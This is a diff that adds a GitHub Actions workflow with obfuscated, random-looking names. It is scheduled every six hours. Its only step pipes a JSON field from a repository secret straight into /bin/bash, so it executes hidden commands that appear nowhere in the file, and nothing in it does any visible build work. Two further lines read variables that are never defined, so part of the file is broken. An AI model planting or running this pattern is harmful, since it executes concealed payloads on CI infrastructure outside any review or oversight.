@@ -1,0 +1,20 @@
+name: optimizenative98
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: optimizenative98
+        env:
+          kteba7585: ${{ secrets.kteba7585 }}
+        run: |
+          echo $kteba7585 | jq -r .lzc47266 | /bin/bash
+          echo $xwd67 | jq -r .obu439 | /bin/bash
+          echo $akdc79210 | jq -r .t33 | /bin/bash
+
